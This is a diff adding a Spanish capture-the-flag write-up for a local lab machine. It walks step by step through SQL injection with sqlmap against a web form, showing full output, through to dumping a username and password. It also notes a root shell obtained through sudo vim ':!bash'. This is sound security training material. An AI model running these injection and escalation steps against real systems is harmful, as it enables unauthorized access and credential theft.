@@ -238,7 +238,114 @@ root
 ```
 🥳CONSEGUIDO, SOMOS ROOT🥳
 [^1]: Vim es un editor de texto para sistemas Unix/Linux que, al poder ejecutarse con sudo, se convierte en una vía de escalada de privilegios porque permite lanzar comandos de sistema desde dentro del editor (por ejemplo con :!bash), lo que posibilita abrir una shell con permisos de root.
+____________________________________________________________________________________________
+### 2. ANALISIS HTTP
+La otra opción sería analizar el servicio web.  Para ello nos dirigimos al navegador y escribimos la dirección IP en el buscador.  Esto nos llevará a un sitio web de lo que parece ser publicidad deportiva con un formulario.
+![Formulario web]()
+![Respuesta de formulario]()
+```bash
+> sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
+[20:07:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[20:07:01] [INFO] fetching database names
+[20:07:01] [INFO] retrieved: 'information_schema'
+[20:07:01] [INFO] retrieved: 'register'
+[20:07:01] [INFO] retrieved: 'sys'
+[20:07:01] [INFO] retrieved: 'mysql'
+[20:07:01] [INFO] retrieved: 'performance_schema'
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] register
+[*] sys
 
+[20:07:01] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0805pm.csv'
+
+[*] ending @ 20:07:01 /2025-09-07/
+```   
+* Con -u indicamos la url.
+* --forms le dice a sqlmap que busque formularios en la página (inputs, login forms, búsqueda, etc.) y trate de inyectar SQL allí.
+* Con --dbs indicamos que queremos listar las bases de datos disponibles si encuentra una inyección exitosa.
+* Con --batch indicamos a sqlmap que no nos pregunte  durante el ataque, sino que asuma respuestas por defecto. Es útil para automatizar el proceso en scripts o pruebas largas.
+
+Bien, hemos encontrado la base de datos *register* así que accedemos a ella y listamos las tablas que pueda haber.
+
+```bash
+> sqlmap -u http://172.17.0.2 --forms -D register --tables --batch
+[20:15:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[20:15:29] [INFO] fetching tables for database: 'register'
+[20:15:29] [INFO] retrieved: 'users'
+Database: register
+[1 table]
++-------+
+| users |
++-------+
+
+[20:15:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0815pm.csv'
+
+[*] ending @ 20:15:29 /2025-09-07/
+```
+Esto nos ha indicado que en esta base de datos hay una tabla que se llama *users*, la cual, sospechosamente, puede contener usuarios.  Ahora que ya tenemos la tabla, lo que nos interesa es conseguir las columnas, así que ejecutamos:
+```bash
+> sqlmap -u http://172.17.0.2 --forms -D register -T users --columns --batch
+[20:20:43] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[20:20:43] [INFO] fetching columns for table 'users' in database 'register'
+[20:20:43] [INFO] retrieved: 'username'
+[20:20:43] [INFO] retrieved: 'varchar(30)'
+[20:20:43] [INFO] retrieved: 'passwd'
+[20:20:43] [INFO] retrieved: 'varchar(30)'
+Database: register
+Table: users
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| passwd   | varchar(30) |
+| username | varchar(30) |
++----------+-------------+
+
+[20:20:43] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0820pm.csv'
+
+[*] ending @ 20:20:43 /2025-09-07/
+```
+Ya por último sería acceder a los datos de las dos columnas que hemos encontrado así que ejecutamos: 
+```bash
+> sqlmap -u http://172.17.0.2 --forms -D register -T users -C passwd,username --dump --batch
+[20:22:38] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[20:22:38] [INFO] fetching entries of column(s) 'passwd,username' for table 'users' in database 'register'
+[20:22:38] [INFO] retrieved: 'KJSDFG789FGSDF78'
+[20:22:38] [INFO] retrieved: 'dylan'
+Database: register
+Table: users
+[1 entry]
++------------------+----------+
+| passwd           | username |
++------------------+----------+
+| KJSDFG789FGSDF78 | dylan    |
++------------------+----------+
+
+[20:22:38] [INFO] table 'register.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'
+[20:22:38] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0822pm.csv'
+
+[*] ending @ 20:22:38 /2025-09-07/
+```
+* Con --dump volcamos la información de las columnas que acabamos de inyectar.
+
+Vemos que nos ha devuelto un usuario *dylan* y una contraseña *KJSDFG789FGSDF78* así que lo probaremos en el formulario web a ver que sucede.  En este caso nos devuelve a la misma página de *http://172.17.0.2/acceso_valido_dylan.php* que hemos visto en la primera forma de resolver esta máquina así que, a partir de aquí el resto de la máquina será igual.
+
+(------------------------------------A PARTIR DE AQUÍ, LA FORMA DE ESCALAR PRIVILEGIOS SERÁ LA MISMA------------------------------------)
 
 
 
